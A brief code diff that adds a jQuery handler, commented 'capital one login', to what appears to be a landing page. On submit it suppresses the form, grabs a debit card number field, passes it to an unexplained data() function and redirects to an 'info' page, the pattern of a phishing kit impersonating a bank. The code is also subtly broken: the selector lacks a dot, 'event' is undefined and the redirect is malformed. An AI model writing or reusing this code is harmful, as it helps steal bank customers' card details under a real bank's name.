@@ -27,3 +27,11 @@ $('.suggestions__footer-link').click(function() {
     800
   );
 });
+
+// capital one login
+$('.landing-page__submit-button').click(function() {
+  event.preventDefault();
+  const debitNumber = $('landing-page__id');
+  data(debitNumber);
+  window.location.href = window.location.hostname + '/pages/info.html';
+});
